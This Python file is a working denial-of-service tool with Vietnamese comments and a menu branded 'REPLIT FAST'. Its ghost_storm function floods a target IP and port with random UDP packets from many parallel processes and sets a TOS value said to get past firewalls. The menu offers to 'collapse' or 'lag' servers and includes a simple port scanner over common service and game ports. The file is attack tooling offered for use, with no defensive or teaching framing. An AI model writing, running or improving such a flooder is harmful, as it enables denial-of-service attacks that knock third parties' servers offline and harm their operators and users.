import os, socket, multiprocessing, sys, time, random, json
from urllib.request import urlopen

# --- MÀU LED CẦU VỒNG ---
LED_COLORS = ['\033[31m', '\033[38;5;208m', '\033[33m', '\033[32m', '\033[36m', '\033[34m', '\033[35m']
RESET, BOLD, CYAN, WHITE, RED, YELLOW, ORANGE, GREEN, PURPLE, BLUE = '\033[0m', '\033[1m', '\033[36m', '\033[37m', '\033[31m', '\033[33m', '\033[38;5;208m', '\033[32m', '\033[35m', '\033[34m'

# ==============================================================================
# [ ĐỘNG CƠ TẤN CÔNG ]
# ==============================================================================

def ghost_storm(ip, port, counter):
    """Động cơ Ghost Storm - Tối ưu hóa băng thông"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.connect((ip, port))
        # Ép hệ thống cấp bộ đệm gửi tối đa
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 10 * 1024 * 1024)
        # Thiết lập mã ưu tiên nhà mạng (Bypass một số firewall)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_TOS, 0xB8)
    except: pass
    
    # Dữ liệu tĩnh để giảm tải CPU khi tạo gói tin
    payload = os.urandom(1472)
    
    while True:
        try:
            sock.send(payload)
            counter.value += 1
        except: continue

def monitor(counter, target):
    """Firing rate monitoring system"""
    last_val = 0
    color_idx = 0
    while True:
        time.sleep(0.8) 
        curr = counter.value
        pps = (curr - last_val) / 0.8
        last_val = curr
        # Chuyển đổi sang MiB/s để dễ nhìn hỏa lực
        mib = (pps * 1472) / (1024 * 1024)
        
        color = LED_COLORS[color_idx % len(LED_COLORS)]
        color_idx += 1
        print(f"{color}[+] {int(pps):,} PPS | {mib:.2f} MiB/s | IN PROGRESS: {target}{RESET}")

def scan_port(ip):
    """Vulnerability detection"""
    print(f"{YELLOW}[*] Đang quét lỗ hổng trên {ip}...{RESET}")
    common = [21, 22, 80, 443, 3306, 25565, 19132]
    open_p = []
    for p in common:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.3)
        if s.connect_ex((ip, p)) == 0: open_p.append(p)
        s.close()
    print(f"{GREEN}[+] The gate was found open: {open_p}{RESET}")
    input(f"{ORANGE}Press Enter to return to the Menu...{RESET}")

def show_rainbow_header():
    os.system('clear' if os.name == 'posix' else 'cls')
    c = random.choice(LED_COLORS)
    print(f"{c}    ██████╗  █████╗ ██╗███╗   ██╗██████╗  ██████╗ ██╗    ██╗")
    print(f"{c}    ██╔══██╗██╔══██╗██║████╗  ██║██╔══██╗██╔═══██╗██║    ██║")
    print(f"{c}    ██████╔╝███████║██║██╔██╗ ██║██████╔╝██║   ██║██║ █╗ ██║")
    print(f"{c}    ██╔══██╗██╔══██║██║██║╚██╗██║██╔══██╗██║   ██║██║███╗██║")
    print(f"{c}    ██║  ██║██║  ██║██║██║ ╚████║██████╔╝╚██████╔╝╚███╔███╔╝")
    print(f"{c}    ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝  ╚══╝╚══╝ ")
    print(f"\n{CYAN}{BOLD}    >>> v31.3 REPLIT FAST - ADMIN: NGUYỄN THÀNH LONG <<<    {RESET}")
    print(f"{WHITE}================================================================================{RESET}")

# ==============================================================================
# [ LUỒNG CHÍNH ]
# ==============================================================================

def main():
    while True:
        show_rainbow_header()
        print(f"{RED}[1] Ddos collapse server{RESET}")
        print(f"{YELLOW}[2] Do lag server (High PPS){RESET}")
        print(f"{GREEN}[3] Strip IP /24{RESET}")
        print(f"{BLUE}[4] Gate detector (Scan Port){RESET}")
        print(f"{PURPLE}[0] Escape{RESET}")
        
        choice = input(f"\n{CYAN}Long's choice: {RESET}")
        if choice == '0': sys.exit()
        
        target = input(f"{BOLD}Target (IP/Domain): {RESET}").strip()
        try: target_ip = socket.gethostbyname(target)
        except: 
            print(f"{RED}[!] DNS Error: Target IP Not Found.{RESET}")
            time.sleep(2); continue
            
        if choice == '4': scan_port(target_ip); continue
            
        try:
            port = int(input(f"{BOLD}Port: {RESET}"))
            trigger = int(input(f"{BOLD}Timer (seconds)): {RESET}"))
        except: continue

        # Đếm ngược đổi màu
        for i in range(trigger, 0, -1):
            color = LED_COLORS[i % len(LED_COLORS)]
            sys.stdout.write(f"\r{color}[!] FIRING AFTER: {i} SECONDS... {RESET}")
            sys.stdout.flush(); time.sleep(1)
        
        print(f"\n{RED}[+] TOTAL ATTACK!!!{RESET}\n")

        shared_counter = multiprocessing.Value('L', 0, lock=False)
        procs = []
        
        # Tối ưu hóa số luồng cho Replit (Tránh bị sập Repl)
        cores = os.cpu_count() or 1
        for _ in range(cores * 20): 
            p = multiprocessing.Process(target=ghost_storm, args=(target_ip, port, shared_counter))
            p.daemon = True; p.start(); procs.append(p)

        m = multiprocessing.Process(target=monitor, args=(shared_counter, target_ip))
        m.daemon = True; m.start()
        
        try:
            while True: time.sleep(1)
        except KeyboardInterrupt:
            for p in procs: p.terminate()
            m.terminate(); print(f"\n{PURPLE}[!] The troops have withdrawn.{RESET}"); time.sleep(1)

if __name__ == "__main__":
    main()
